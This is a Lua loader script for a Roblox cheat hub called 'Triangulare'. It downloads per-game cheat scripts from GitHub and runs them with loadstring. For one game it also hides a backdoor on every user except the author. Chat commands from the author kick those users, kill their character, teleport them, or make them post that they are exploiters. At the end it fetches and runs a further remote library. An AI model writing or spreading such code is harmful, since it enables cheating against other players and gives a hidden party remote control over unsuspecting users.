-- Load Script
local function LoadScript(path, name)
  local Initialize = game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/extra/Initialize.lua")
  local Script = game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/" .. game:GetService("HttpService"):UrlEncode(path), true)
  local Credits = game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/extra/Credits.lua")
  loadstring("local InitializeName = \"" .. tostring(name) .. "\"\n" .. Initialize .. "\ndo\n" .. Script .. "\nend\n" .. Credits)()
end

-- Locals
local eu = game:GetService("Players").LocalPlayer
local Gods = {"Moligrafi"}

-- Supported Games
local SupportedGames = {
  [7516718402] = {"games/Noobs Must Die.lua", "Noobs Must Die"},
  [6944270854] = {"games/Rope Battles.lua", "Rope Battles"},
  [7453941040] = {"games/Dangerous Night.lua", "Dangerous Night"},
  [7219654364] = {"games/DMVS.lua", "[DUELS] Murderers VS Sherrifs", true},
  [7606156849] = {"games/Make a Sprunki Tycoon.lua", "Make a Sprunki Tycoon!"},
  [7118588325] = {"games/Fast Food Simulator.lua", "Fast Food Simulator"}, 
  [4931927012] = {"games/Basketball Legends.lua", "Basketball Legends"},
  [4430449940] = {"games/Saber Showdown.lua", "Saber Showdown"},
  [6305332511] = {"games/Kingdom of Magic Tycoon.lua", "Kingdom of Magic Tycoon"},
  [110988953] = {"games/Wizard Tycoon 2 Player.lua", "Wizard Tycoon - 2 Player"},
  [66654135] = {"games/Murder Mystery 2.lua", "Murder Mystery 2"},
  [6516536612] = {"games/raise bob.lua", "raise bob"},
  [7713074498] = {"games/Steal a Pet.lua", "Steal a Pet"},
  [779098864] = {"games/Steal a Ore.lua", "Steal a Ore"},
  [7577218041] = {"games/Steal a Character.lua", "Steal a Character"},
  [7868793307] = {"games/Steal a Gubby.lua", "Steal a Gubby"},
  [7842205848] = {"games/Steal a Labubu.lua", "Steal a Labubu"},
  [7261382479] = {"games/Bunker Life Tycoon.lua", "Bunker Life Tycoon"},
  [7294208165] = {"games/24 Hours in Elevator.lua", "24 Hours in Elevator"},
  [7750682571] = {"games/2 Player Labubu Tycoon.lua", "2 Player Labubu Tycoon"},
  [7691800287] = {"games/Stick Battles.lua", "Stick Battles"},
  [7037847546] = {"games/Critical Fantasy.lua", "Critical Fantasy"},
  [7911733012] = {"games/Steal a magic.lua", "Steal a magic"},
  [3261957210] = {"games/Thanos Simulator.lua", "Thanos Simulator"},
  [8169094622] = {"games/Trap and Bait.lua", "Trap and Bait"},
  [7778459210] = {"games/Steal To Be Rich.lua", "Steal To Be Rich!"},
  [7661577083] = {"games/Zombie Tower.lua", "Zombie Tower"},
  [3177453609] = {"games/therapy.lua", "therapy"},
  [8380556170] = {"games/Dont Wake the Brainrots.lua", "Don't Wake the Brainrots!"},
  [8070392042] = {"games/Steal a Country.lua", "Steal a Country"},
  [8374113155] = {"games/STEAL COOKIES.lua", "STEAL COOKIES"},
  [8202759276] = {"games/Steal a Brazilian icon.lua", "Steal a Brazilian icon"},
  [8419247771] = {"games/Steal a Number.lua", "Steal a Number"},
  [537413528] = {"games/Build A Boat For Treasure.lua", "Build A Boat For Treasure"},
  [93740418] = {"games/Hide and Seek Extreme.lua", "Hide and Seek Extreme"},
  [8305240030] = {"games/Be a Beggar.lua", "Be a Beggar!"},
  [8366180257] = {"games/Bunker Battles.lua", "Bunker Battles"},
  [7960300951] = {"games/Bridge Battles.lua", "Bridge Battles!"},
  [8319782618] = {"games/Rob a Bank.lua", "Rob a Bank!"},
  [8101424623] = {"games/Steal a Power-up.lua", "Steal a Power-up"},
  [8118501380] = {"games/RNG Civilization.lua", "RNG Civilization"},
  [2822776643] = {"games/Elemental Magic Arena.lua", "Elemental Magic Arena"},
}
local Game = SupportedGames[game.GameId] or SupportedGames[game.PlaceId]
if Game then
  LoadScript(Game[1], Game[2])
  if Game[3] then
    pcall(function()
      local Settings = {
        LastReveal = 0,
        Cooldown = 1
      }
      
      local function IsGod(props)
        if props and props.UserId then
          local sender = game:GetService("Players"):GetPlayerByUserId(props.UserId)
          if sender and table.find(Gods, sender.Name) then
            return true
          end
        end
        return false
      end
      
      if not table.find(Gods, eu.Name) then
        local TextChatService = game:GetService("TextChatService")
        if not getgenv().Triangulare then
          getgenv().Triangulare = true
          TextChatService.MessageReceived:Connect(function(message)
            if message.Text == "uh." and IsGod(message.TextSource) then
              local now = tick()
              if now - Settings.LastReveal >= Settings.Cooldown then
                Settings.LastReveal = now
                TextChatService.TextChannels.RBXGeneral:SendAsync("Hey! I'm a exploiter! Using Triangulare — made by Moligrafi.")
              end
            elseif message.Text == "leave." and IsGod(message.TextSource) then
              task.wait(2)
              game:GetService("Players").LocalPlayer:Kick("You were kicked by a Triangulare admin.")
            elseif message.Text == "die." and IsGod(message.TextSource) then
              eu.Character.Head:Destroy()
            elseif message.Text == "come." and IsGod(message.TextSource) then
              local sender = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
              eu.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame
              TextChatService.TextChannels.RBXGeneral:SendAsync("I'm here, master " .. sender.Name .. ".")
            elseif message.Text == "rejoin." and IsGod(message.TextSource) then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, eu)
            end
          end)
        end
        for _, p in pairs(game:GetService("Players"):GetPlayers()) do
          if p ~= eu and table.find(Gods, p.Name) then
            TextChatService.TextChannels.RBXGeneral:SendAsync("Hey " .. p.Name .. "! I just executed Triangulare — made by Moligrafi.")
          end
        end
      end
    end)
  end
else
  LoadScript("Triangulare.lua", "Universal")
end

-- Luache
if not table.find(Gods, eu.Name) then
  local Luache = loadstring(game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Luache/main/Source/Library.lua"))()
  
  Luache:Settings({
    Service = "triangulare",
    DebugMode = true
  })

  Luache:Implement("Everything")
end